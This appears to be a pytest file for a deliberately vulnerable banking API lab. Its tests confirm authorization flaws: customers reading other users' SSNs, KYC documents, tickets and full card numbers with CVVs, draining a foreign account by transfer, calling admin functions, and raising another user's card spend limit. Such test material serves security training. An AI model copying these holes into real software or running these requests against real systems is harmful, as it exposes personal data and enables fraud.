"""LOCK-IN: Broken Object Level Authorization (BOLA / IDOR) and Broken Function
Level Authorization (BFLA) across accounts, transfers, kyc, support, cards and
admin. Each test proves a customer can reach objects/functions they must not.
Docstrings map each test to its README INTENTIONALLY VULNERABLE row.
"""

from conftest import SEEDED


# --------------------------- accounts ---------------------------

def test_bola_read_foreign_account_exposes_full_ssn(client, alice):
    """README: BOLA read of an account you don't own + excessive data exposure
    (full SSN + DOB). alice reads account 5 (bob's)."""
    r = client.get("/api/accounts/accounts/5", headers=alice["headers"])
    assert r.status_code == 200
    body = r.json()
    assert body["user_id"] == SEEDED["bob"]["user_id"]
    assert body["user_id"] != alice["user_id"]
    assert body["ssn_full"], "full SSN should be exposed"
    assert body["date_of_birth"], "date of birth should be exposed"


# --------------------------- transfers ---------------------------

def test_bola_transfer_drains_foreign_account(client, alice):
    """README: BOLA on transfers -- move funds out of an account that isn't
    yours, and it really drains it via /internal/apply-transfer. alice pulls
    from carol's account 7 into her own 3."""
    before = client.get("/api/accounts/accounts/7", headers=alice["headers"]).json()["balance_cents"]
    r = client.post("/api/transfers/transfers", headers=alice["headers"], json={
        "from_account_id": 7, "to_account_id": 3, "amount_cents": 100, "memo": "bola drain",
    })
    assert r.status_code == 201
    assert r.json()["status"] == "completed"
    after = client.get("/api/accounts/accounts/7", headers=alice["headers"]).json()["balance_cents"]
    assert after == before - 100  # a real, unauthorized debit


def test_bfla_admin_override_as_customer(client, alice):
    """README: BFLA -- transfers admin-override uses get_current_user, not
    require_admin, so a plain customer flips a transfer's status."""
    # Create our own transfer first so we don't clobber seeded rows.
    t = client.post("/api/transfers/transfers", headers=alice["headers"], json={
        "from_account_id": 3, "to_account_id": 4, "amount_cents": 100, "memo": "to override",
    })
    tid = t.json()["id"]

    r = client.post("/api/transfers/transfers/admin-override", headers=alice["headers"],
                    json={"transfer_id": tid, "new_status": "reversed"})
    assert r.status_code == 200
    assert r.json()["status"] == "reversed"
    assert alice["user"]["role"] == "customer"  # done with a customer token


# --------------------------- kyc ---------------------------

def test_bfla_kyc_pending_leaks_other_customers(client, alice):
    """README: BFLA + PII exposure -- /kyc/pending uses get_current_user, so any
    customer enumerates every customer's pending identity docs."""
    r = client.get("/api/kyc/kyc/pending", headers=alice["headers"])
    assert r.status_code == 200
    docs = r.json()
    assert len(docs) >= 1
    # At least one pending doc belongs to someone other than alice (bob's).
    assert any(d["user_id"] != alice["user_id"] for d in docs)


def test_idor_kyc_read_and_download_foreign_doc(client, bob):
    """README: KYC IDOR -- read + download another customer's document by id.
    bob reads/downloads doc id 1 (alice's)."""
    meta = client.get("/api/kyc/kyc/1", headers=bob["headers"])
    assert meta.status_code == 200
    assert meta.json()["user_id"] == SEEDED["alice"]["user_id"]
    assert meta.json()["user_id"] != bob["user_id"]

    dl = client.get("/api/kyc/kyc/1/download", headers=bob["headers"])
    assert dl.status_code == 200
    assert len(dl.content) > 0


# --------------------------- support ---------------------------

def test_bfla_tickets_all_and_idor_read_foreign_ticket(client, bob):
    """README: BFLA -- /tickets/all has no role check; IDOR -- read any ticket
    by id. bob lists all tickets and reads ticket 1 (alice's)."""
    all_t = client.get("/api/support/tickets/all", headers=bob["headers"])
    assert all_t.status_code == 200
    assert len(all_t.json()) >= 2  # sees more than bob's own

    one = client.get("/api/support/tickets/1", headers=bob["headers"])
    assert one.status_code == 200
    assert one.json()["user_id"] == SEEDED["alice"]["user_id"]
    assert one.json()["user_id"] != bob["user_id"]


# --------------------------- cards ---------------------------

def test_bola_read_foreign_card_exposes_pan_and_cvv(client, alice):
    """README: BOLA + excessive data exposure -- read any card by id, full PAN
    and CVV returned. alice reads card 2 (bob's)."""
    r = client.get("/api/cards/cards/2", headers=alice["headers"])
    assert r.status_code == 200
    card = r.json()
    assert card["user_id"] == SEEDED["bob"]["user_id"]
    assert card["user_id"] != alice["user_id"]
    assert len(card["card_number"]) >= 12  # full PAN, not just last4
    assert card["cvv"]


def test_mass_assignment_raise_foreign_card_spend_limit(client, alice):
    """README: mass assignment + BOLA -- PATCH sets spend_limit_cents on any
    card. alice raises the limit on card 2 (bob's)."""
    r = client.patch("/api/cards/cards/2", headers=alice["headers"],
                     json={"spend_limit_cents": 999999999})
    assert r.status_code == 200
    assert r.json()["spend_limit_cents"] == 999999999


def test_bola_freeze_and_unfreeze_foreign_card(client, alice):
    """README: BOLA -- freeze/unfreeze anyone's card by id. alice freezes card 3
    (carol's), then restores it to 'active'."""
    fr = client.post("/api/cards/cards/3/freeze", headers=alice["headers"])
    assert fr.status_code == 200
    assert fr.json()["status"] == "frozen"

    un = client.post("/api/cards/cards/3/unfreeze", headers=alice["headers"])
    assert un.status_code == 200
    assert un.json()["status"] == "active"  # restore seeded state


def test_bola_issue_card_on_foreign_funding_account(client, alice):
    """README: BOLA / business-logic -- issue a card funded by an account you
    don't own. alice issues a card against carol's account 7."""
    r = client.post("/api/cards/cards", headers=alice["headers"],
                    json={"account_id": 7, "card_type": "virtual"})
    assert r.status_code == 201
    card = r.json()
    assert card["account_id"] == 7  # carol's funding account
    assert card["user_id"] == alice["user_id"]  # owned by the caller


# --------------------------- admin ---------------------------

def test_bfla_admin_overview_as_customer(client, alice):
    """README: BFLA -- /admin/overview uses get_current_user, not require_admin,
    so a plain customer reaches the staff traffic overview."""
    r = client.get("/api/admin/admin/overview", headers=alice["headers"])
    assert r.status_code == 200
    assert "total_requests" in r.json()
    assert alice["user"]["role"] == "customer"
